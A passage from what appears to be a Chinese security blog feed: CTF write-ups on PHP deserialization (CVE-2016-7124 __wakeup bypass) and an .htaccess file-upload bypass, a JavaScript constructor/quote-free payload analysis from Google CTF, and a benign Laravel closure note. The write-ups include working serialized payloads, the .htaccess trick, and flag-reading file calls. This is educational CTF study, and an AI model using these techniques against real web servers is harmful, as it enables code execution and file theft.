href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/2.png" style="width:800px;"><p>获得备份文件 <a href="http://www.zip.下载解压/">www.zip。下载解压</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/3.png" style="width:200px;"><br><p>index.php 源码可以阉割成这样:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>class.php 源码可以阉割成这样如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="comment">//魔术方法。在反序列化时自动调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//析构方法，在类执行完毕资源回收时自动调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>看到一个 <code>__wakeup()</code> 。这个函数会将 <code>$this-&gt;username</code> 赋值为 <em>guest</em>。可是其值需要为 <em>admin</em> 才能获取 flag。</p><p>我们可以试试 <em>CVE-2016-7124</em>。这个 CVE 是专门针绕过 <code>__wakeup()</code>方法的。影响范围为 <em>PHP before 5.6.25 and 7.x before 7.0.10</em>。</p><p>利用方式为，当序列化字符串中 ，若对象属性数大于实际属性数时， <code>__wakeup()</code> 将不会被自动调用</p><p>若不会PHP反序列化，安利下之前写过的一篇文章 :)</p><p><a href="https://www.freebuf.com/articles/web/209975.html">https://www.freebuf.com/articles/web/209975.html</a></p><br><p><strong>poc:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php5.6 ttt.php</span><br><span class="line">/var/www/html/ctf/ttt.php:12:</span><br><span class="line">string(106) &quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\000Name\000username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\000Name\000password&quot;;i:100;s:15:&quot;\000Name\000password2&quot;;i:100;&#125;&quot;</span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原 payload。实际对象属性数为<span class="number">2</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">修改后 payload。注意对象属性数被修改为 <span class="number">3</span>，比实际对象属性数大</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>payload打上去即显示 flag</p><br><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>参考:</p><p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a></p><br><p>这道题只要上传文件名为 .php* .phtml* 都会被拦截。</p><p>另辟蹊径，上传 .htaccess 进行绕过。.htaccess 内容为 <u>当前目录下所有 .jpg 后缀文件都以 php 进行解析</u></p><p><em>.htaccess</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><br><p>上传成功后再传个普通的 php一句话即可，查看 <code>phpinfo()</code>。</p><p>disable_functions:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</span><br></pre></td></tr></table></figure><br><p>由于只是 get flag。那就不 getshell了。 bypass disable_function 过几天本地搭建研究下（挖一坑）。直接使用 php 内置的扫目录和读文件命令 <code>scandir</code> 和 <code>file_get_contents</code> 来进行读 flag 操作</p><br><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[扫目录]</span><br><span class="line">var_dump(scandir(<span class="string">&quot;../../../../../../&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=============</span><br><span class="line">[读flag]</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;../../../../../../flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag&#123;xxxxxxx&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末玩了玩CTF，做个小记录&lt;/p&gt;
&lt;p&gt;平台地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://buuoj.cn/&quot;&gt;https://buuoj.cn/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Javascript constructor 相关小知识分享</title>
    <link href="http://example.com/2021/03/11/2021-03-11-javascript-constructor/"/>
    <id>http://example.com/2021/03/11/2021-03-11-javascript-constructor/</id>
    <published>2021-03-11T07:57:35.000Z</published>
    <updated>2021-03-11T13:55:52.879Z</updated>
    
    <content type="html"><![CDATA[<p>看了 Orange大佬的 “<a href="http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html">Google CTF 2018 Quals Web Challenge - gCalc</a>” 一文。发现了许多有趣的小技巧小知识。这里简单写一写关于这些小知识的理解。</p><span id="more"></span><br><h1 id="分析正则表达式"><a href="#分析正则表达式" class="headerlink" title="分析正则表达式"></a>分析正则表达式</h1><p>原文中提到了一个在线正则表达式平台，使用了下确实好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(?:[\(\)\*\&#x2F;\+%\-0-9 ]|\bvars\b|[.]\w+)*$&#x2F;</span><br></pre></td></tr></table></figure><p><strong>这个正则表达式主要内容可以分为 三部分，注意各个部分是使用 | 进行分割:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?:[\(\)\*\&#x2F;\+%\-0-9 ]</span><br></pre></td></tr></table></figure><p>扩展解释下正则表达式</p><p>A|B     为或，匹配捕获 A 或者 B</p><p>A(?=B) 匹配时 AB 需要连着。捕获时只返回A</p><p>A(?!B)  匹配时 AB 不能连着。捕获时只返回A</p><p>A(?:B)  匹配时 AB 需要连着。但是不捕获。仅匹配。一般配合 | 使用。可以理解为 可有可无</p><img src="/2021/03/11/2021-03-11-javascript-constructor/1.png" style="width:200px;"><br><img src="/2021/03/11/2021-03-11-javascript-constructor/2.png" style="width:200px;"><p>这一段正则表达式的意思为，仅匹配 <code>( ) * / + % - 0-9 空格</code> 这些字符</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\bvars\b</span><br></pre></td></tr></table></figure><p>\b 匹配一个单词边界，不过好像不太重要</p><p>这一段正则表达式的意思为，待匹配字符串必须存在 <code>vars</code> 这一个字符串</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[.]\w+</span><br></pre></td></tr></table></figure><p>这一段正则表达式的意思为，匹配 <code>.</code> 和各个单词字符</p><p>regex101 有 Debugger 模式，可以输入以下字符串进行匹配，更易理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(vars).toString()</span><br></pre></td></tr></table></figure><br><h1 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h1><p><em>Object</em> 都带有一个 <em>constructor</em>，<em>用于返回创建实例对象的构造函数的引用</em>。</p><p>不同类型会不一样。即什么类型的 <em>constructor</em> 将会返回什么类型的实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor</span><br><span class="line">[OUTPUT:] ƒ <span class="function"><span class="title">Number</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br><span class="line"></span><br><span class="line">x1.toString().constructor</span><br><span class="line">[OUTPUT:] ƒ <span class="function"><span class="title">String</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br></pre></td></tr></table></figure><p>基本使用看<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor">官方文档</a>就好了。</p><br><p><strong>重点说下有意思的地方。</strong></p><p>如果调用 <strong>一层</strong> <em>constructor</em>。则这个构造函数是 对应类型 的构造函数。只能输入指定类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor(<span class="number">33</span>)</span><br><span class="line">[OUTPUT:] <span class="number">33</span></span><br><span class="line"></span><br><span class="line">x1.constructor(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">[OUTPUT:] <span class="literal">NaN</span></span><br></pre></td></tr></table></figure><p>但是如果调用 <strong>多层</strong> <em>constructor</em>. 则多层构造函数返回一个匿名函数。函数体内容为输入的参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line">[OUTPUT:] </span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想实现调用，在末尾添加一对 <code>()</code> 即可。这是 js 调用函数的格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)()</span><br></pre></td></tr></table></figure><p>在 writeup 中，由于无法传入单双引号。所以第一个 <em>Payload</em> 只能使用 <code>fromCharCode()</code> 的方式获取字符串</p><br><h1 id="Javascript-无引号利用"><a href="#Javascript-无引号利用" class="headerlink" title="Javascript 无引号利用"></a>Javascript 无引号利用</h1><p>文章中最终的 payload 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>).constructor.constructor(<span class="regexp">/1/</span>.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop())</span><br></pre></td></tr></table></figure><p>首先需要理解，最终的 payload 是需要获取 <code>vars</code> 的索引值来 alert。</p><p>Javascript Object 中有个名为 <em>keys</em> 的方法。<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys">官网</a>中有例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload)</span><br><span class="line">[OUTPUT:] [<span class="string">&quot;alert(1)&quot;</span>]</span><br></pre></td></tr></table></figure><p>再结合 Array 的 pop 方法。我们就可以获取索引值了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload).pop()</span><br><span class="line">[OUTPUT:] <span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><br><p>原 payload 是先使用正则表达式来获取 Object，然后才能获取索引值。我们来分析下</p><p>这一段使用正则表达式获取一个 Object </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">groups: <span class="literal">undefined</span></span><br><span class="line">index: <span class="number">0</span></span><br><span class="line">input: <span class="string">&quot;1&quot;</span></span><br><span class="line">length: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>通过 Object keys 方法获取到数组迭代器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:] <span class="built_in">Array</span> Iterator &#123;&#125;</span><br></pre></td></tr></table></figure><p>有了数组迭代器，就可以快乐的使用 keys 和 pop 获取索引值了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(payload).pop()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;看了 Orange大佬的 “&lt;a href=&quot;http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html&quot;&gt;Google CTF 2018 Quals Web Challenge - gCalc&lt;/a&gt;” 一文。发现了许多有趣的小技巧小知识。这里简单写一写关于这些小知识的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Javascript" scheme="http://example.com/categories/Javascript/"/>
    
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="正则表达式" scheme="http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP闭包在类中的小笔记</title>
    <link href="http://example.com/2021/03/03/2021-03-03-Closure-inClass/"/>
    <id>http://example.com/2021/03/03/2021-03-03-Closure-inClass/</id>
    <published>2021-03-03T07:39:18.000Z</published>
    <updated>2021-03-15T15:35:37.783Z</updated>
    
    <content type="html"><![CDATA[<br><p>在翻看 Laravel 源码时，发现其进行服务注册的时候，大量使用了诸如这样的格式:</p><span id="more"></span><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$app</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//所有服务类的构造方法</span></span><br><span class="line"><span class="comment">//$app 用于存放 容器类 的实例</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//注册方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类B</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceB</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//注册方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//容器类</span></span><br><span class="line"><span class="comment">//$bindings 存放各个服务类的实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//注册各个服务类</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//入口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//容器类</span></span><br><span class="line"><span class="variable">$Container</span> = <span class="keyword">new</span> Container();</span><br><span class="line"><span class="variable">$ServiceA</span> = <span class="keyword">new</span> ServiceA(<span class="variable">$Container</span>);</span><br><span class="line"><span class="variable">$ServiceB</span> = <span class="keyword">new</span> ServiceB(<span class="variable">$Container</span>);</span><br><span class="line">        <span class="comment">//注册服务</span></span><br><span class="line"><span class="variable">$ServiceA</span>-&gt;register();</span><br><span class="line">        <span class="variable">$ServiceB</span>-&gt;register([</span><br><span class="line">        <span class="string">&#x27;arg1&#x27;</span> =&gt; <span class="string">&#x27;value1&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Index</span> = <span class="keyword">new</span> Index();</span><br></pre></td></tr></table></figure><br><p>以上代码中，<em>Index</em>类为入口，将服务类 <em>ServiceA</em> 和 <em>ServiceB</em> 的实例存放于 容器类 <em>Container</em> 中</p><p>这里值得注意的是，服务类在调用容器类 <em>Container</em> 的注册方法 <em>singleton</em> 时，第一个参数是注册的名字，第二个参数是一个匿名函数。</p><p>这样子操作，在容器类 <em>Container</em> 的 注册方法 <em>singleton</em> 中，<code>$concrete</code> 的值到底是什么呢？匿名函数的 <em>Closure</em> 实例吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//服务类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//容器类</span></span><br><span class="line"><span class="comment">//$bindings 存放各个服务类的实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//注册各个服务类</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>通过 <em>Debuger</em> 可以看到，<code>$concrete</code> 传入的确实是一个 <code>Closure</code>类，只不过这个类里头包含两个成员:<code>$this</code> 和 <code>parameter</code>。其中 <code>$this</code> 的值为 <strong>调用类</strong> 的 <em>$this</em>。而 <code>parameter</code> 里头的值为 <em>闭包</em> 的 形参。如果使用了 <em>use</em> 语句，还会多一个 <em>static</em> 字段，用于存放 <em>use</em> 的变量</p><img src="/2021/03/03/2021-03-03-Closure-inClass/1.png" style="width:500px"><p>那传入<em>闭包</em> 给 <code>$bindings</code> 有什么作用呢？可能这是一种设计模式吧。。还没怎么了解。。。Laravel 之后的代码中也确实通过类似下面的方式进行了调用。个人认为这样子相当于为服务类新增多一个单独的方法吧。可以这样子调用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Container</span>-&gt;bindings[ServiceA::class](<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>更多高级点的知识参考下这篇文章</p><p><a href="https://www.cnblogs.com/echojson/p/10957362.html">https://www.cnblogs.com/echojson/p/10957362.html</a></p><br><h1 id="在-Laravel-中的相关操作"><a href="#在-Laravel-中的相关操作" class="headerlink" title="在 Laravel 中的相关操作"></a>在 Laravel 中的相关操作</h1><p><em>Laravel</em> 中，有个叫 <em>Container</em> 的类，用于存放各个实例化的类，方便随时调用。</p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>为了将各个类注册进 <em>Container</em> 中，<em>Container</em>类有一个名为 <em>bind</em> 的方法专门用于将实例化的类存入 <em>bindings</em> 成员变量中。这些实例化的类有很多都是带着匿名函数的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 